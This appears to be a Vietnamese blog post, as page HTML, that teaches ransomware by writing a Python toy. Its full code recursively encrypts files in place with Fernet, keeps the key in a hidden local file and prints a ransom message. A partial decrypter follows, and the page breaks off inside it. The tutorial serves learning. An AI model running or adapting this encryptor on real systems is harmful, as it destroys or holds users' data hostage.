@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="vi">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Nam Nguyễn">
+<meta name="description" content="Học về ransomware bằng cách làm 1 con ransomware" />
+<meta name="keywords" content="homepage, blog, lập trình, hack, bảo mật" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://namberino.github.io/vi/posts/2024/02/ransomware-v%C3%B4-h%E1%BA%A1i-nh%E1%BA%A5t-tr%C3%AAn-th%E1%BA%BF-gi%E1%BB%9Bi/" />
+
+
+    <title>
+        
+            Ransomware vô hại nhất trên thế giới :: Nam&#39;s Journal 
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.f328c18cc29e8f38ea9856605ac2b3d52498b99bcd296a7867e57a6cd4ba1ec8.css" integrity="sha256-8yjBjMKejzjqmFZgWsKz1SSYuZvNKWp4Z&#43;V6bNS6Hsg=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Ransomware vô hại nhất trên thế giới">
+  <meta itemprop="description" content="Học về ransomware bằng cách làm 1 con ransomware">
+  <meta itemprop="datePublished" content="2024-02-23T17:37:37+07:00">
+  <meta itemprop="dateModified" content="2024-02-23T17:37:37+07:00">
+  <meta itemprop="wordCount" content="1300">
+  <meta itemprop="image" content="https://namberino.github.io/">
+  <meta itemprop="keywords" content="Lập Trình,Hack,Bảo Mật">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://namberino.github.io/">
+  <meta name="twitter:title" content="Ransomware vô hại nhất trên thế giới">
+  <meta name="twitter:description" content="Học về ransomware bằng cách làm 1 con ransomware">
+
+
+
+    <meta property="og:url" content="https://namberino.github.io/vi/posts/2024/02/ransomware-v%C3%B4-h%E1%BA%A1i-nh%E1%BA%A5t-tr%C3%AAn-th%E1%BA%BF-gi%E1%BB%9Bi/">
+  <meta property="og:site_name" content="Nam&#39;s Journal">
+  <meta property="og:title" content="Ransomware vô hại nhất trên thế giới">
+  <meta property="og:description" content="Học về ransomware bằng cách làm 1 con ransomware">
+  <meta property="og:locale" content="vi">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-02-23T17:37:37+07:00">
+    <meta property="article:modified_time" content="2024-02-23T17:37:37+07:00">
+    <meta property="article:tag" content="Lập Trình">
+    <meta property="article:tag" content="Hack">
+    <meta property="article:tag" content="Bảo Mật">
+    <meta property="og:image" content="https://namberino.github.io/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-02-23 17:37:37 &#43;0700 &#43;07" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+            delimiters: [
+                {left: "$$", right: "$$", display: true},
+                {left: "$", right: "$", display: false}
+            ]
+        });
+    });
+</script>
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                nam$journal</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/vi/about/">About me</a></li><li><a href="/vi/posts/">Bài đăng</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+                <span class="theme-toggle not-selectable" style="margin-left: 1.5rem; margin-right: 1rem;">
+	
+        
+            
+            
+                <a href="https://namberino.github.io/posts/2024/02/the-worlds-most-harmless-ransomware/" style="text-decoration: none;"> EN </a>
+            
+        
+	
+        
+            
+                <div style="margin-left: 0.12rem; margin-right: 0.12rem;"> | </div>
+            
+            <a class="active language" style="text-decoration: underline;"> VI </a>
+            
+                <div> </div>
+            
+        
+	
+
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        7 minutes
+
+         | Also available in
+          
+              <a href="https://namberino.github.io/posts/2024/02/the-worlds-most-harmless-ransomware/"><span class="flag fi fi-gb"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://namberino.github.io/vi/posts/2024/02/ransomware-v%C3%B4-h%E1%BA%A1i-nh%E1%BA%A5t-tr%C3%AAn-th%E1%BA%BF-gi%E1%BB%9Bi/">Ransomware vô hại nhất trên thế giới</a>
+      </h1>
+
+      
+        <div class="post-excerpt">Học về ransomware bằng cách làm 1 con ransomware</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <blockquote>
+<p><strong>Lưu ý</strong>: <strong>Không</strong> sử dụng phần mềm này cho việc xấu. Phần mềm này được làm cho mục đích học tập. Nếu bạn muốn chạy ransomware này thì chạy nó trong môi trường ảo, môi trường đã được cách ly. <strong>Đừng sử dụng nó cho việc xấu!</strong></p>
+</blockquote>
+<p>Kể từ khi mình bắt đầu xem phim <em>Mr. Robot</em>, mình thấy rất hứng thú với hacker và hack. Mình không phải là hacker nhưng mình rất thích học về các cách hack mà nhiều người khác nghĩ ra.</p>
+<p>1 cách hack mà mình thấy rất thú vị là <em>ransomware</em>. Phần mềm này có khả năng mã hóa hết các file trên máy tính và tống tiền mình để giải mã các file đó. Với mình thì nó vừa đáng sợ, vừa thú vị.</p>
+<p>Trong lúc mình học về ransomware, mình quyết định tự làm 1 con ransomware đơn giản và không có hại mấy để hiểu về ransomware hơn. Vậy nên trong bài đăng này chúng ta sẽ cùng học về ransomware bằng cách lập trình nó!</p>
+<hr>
+<h1 id="ý-tưởng-đằng-sau-ransomware">Ý tưởng đằng sau ransomware</h1>
+<p>Ransomware sẽ mã hóa hết các file trên máy tính và chỉ giải mã các file đó khi mà hacker cho phép nó giải mã (điều này thường xảy ra sau khi nạn nhân bị hack đã trả tiền cho hacker).</p>
+<p>Chúng ta sẽ cần 1 cách để tìm hết các file trên máy tính, mã hóa nó bằng 1 cái key (chìa khóa) giống như khóa bằng móc khóa ngoài đời thật, và giải mã nó bằng key mà mình dùng để mã hóa nó.</p>
+<hr>
+<h1 id="môi-trường-lập-trình">Môi trường lập trình</h1>
+<p>Mình cần dùng <em>thư viện mã hóa</em> trong Python để mã hóa và giải mã các file mình tìm đc. Mình sử dụng thư viện có tên là <code>cryptography</code> và chúng ta có thể tải thư viện này bằng <code>pip</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
+</span></span></code></pre></div><hr>
+<h1 id="cách-tìm-và-mã-hóa-file">Cách tìm và mã hóa file</h1>
+<p>Thế làm thế nào để mình mã hóa hết các file trên máy? Đầu tiên thì mình phải tìm được hết các file trên máy tính. Mình sử dụng thư viện <code>os</code> của Python để tìm file. Mình cũng sẽ sử dụng thuật toán <em>Fernet</em> ở trong thư viện mã hóa mình vừa cài để mã hóa các file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
+</span></span></code></pre></div><p>Chúng ta lưu các file trên máy mà chúng ta tìm được trong 1 danh sách gọi là <code>files</code>.</p>
+<p>Chúng ta cần check xem cái &ldquo;file&rdquo; đó là 1 file bình thường hay là 1 folder. Chúng ta có thể dùng hàm <code>os.path.isfile()</code> để check. Nếu như &ldquo;file&rdquo; đó không phải là file mà là folder thì chúng ta cần đi vào trong folder đó và check các file trong folder đó. Nếu folder đó có folder thì sẽ tiếp tục vào folder trong folder đó.</p>
+<p>Sau khi chúng ta tìm đường dẫn của các file, chúng ta sẽ lưu đường dẫn tới các file đó trong danh sách <code>files</code>.</p>
+<p>Chúng ta cũng cần tránh không lưu chương trình mã hóa, giải mã và key của mình trong lúc tìm kiếm file bởi vì nếu như chúng ta mã hóa file giải mã và file key thì sau này sẽ không giải mã các file được.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># bill-cipher.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span></code></pre></div><p>Tiếp theo, chúng ta cần tạo key để mã hóa các file chương trình của mình đã tìm được. Key này sẽ được lưu trong <code>.a_deal</code> (mình lưu trong file thế này bởi vì các file có chấm ở đầu tên file sẽ được ẩn trên các hệ thống Unix).</p>
+<p>Sau khi chúng ta tạo key thì chúng ta sẽ cần mở các file bằng đường dẫn mình lưu trong <code>files</code>, đọc file và mã hóa nội dung mình đọc được từ file, rồi viết nội dung đã mã hóa vào lại file. Mình đọc và viết ở chế độ nhị phân bởi vì thuật toán Fernet được dùng cho nhị phân.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
+</span></span></code></pre></div><p>Thế là xong chương trình mã hóa file (<code>bill-cipher.py</code>). Đây là code cho chương trình mã hóa này:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã bị mã hóa! Trả tiền thì sẽ giải mã&#34;</span>)
+</span></span></code></pre></div><p>Nếu như mình chạy file <code>bill-cipher.py</code> thì có thể thấy là các file mà chương trình này tìm được sẽ bị mã hóa và trở thành file chứa 1 đống chữ cái, ký tự random.</p>
+<p><img alt="file1-encrypted" src="/img/file1-encrypted.png"></p>
+<p>Chương trình này cũng có thể mã hóa file ảnh và video nữa.</p>
+<p><img alt="pic-encrypted" src="/img/pic-encrypted.png"></p>
+<p>Chúng ta biết cách tìm và mã hóa các file trên máy rồi, bây giờ chúng ta cần cách giải mã các file đó.</p>
+<hr>
+<h1 id="cách-giải-mã">Cách giải mã</h1>
+<p>Để giải mã các file bị mã hóa, chúng ta sẽ cần tìm các file đó trước. Thế nên chúng ta sẽ dùng đoạn code tìm file của chương trình mã hóa trên.</p>
+<p>Sau khi tìm được file, chúng ta cần đọc key trong <code>.a_deal</code> để giải mã các file bị mã hóa bằng key này.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span></code></pre></div><p>Chúng ta sẽ đọc nội dung file ở chế độ nhị phân, giải mã bằng key trong <code>.a_deal</code> và viết nội dung đã giải mã vào lại file đó.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
+</span></span></code></pre></div><p>Thế là xong chương trình giải mã file (<code>bill-cipher.py</code>). Đây là code cho chương trình giải mã này:</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>
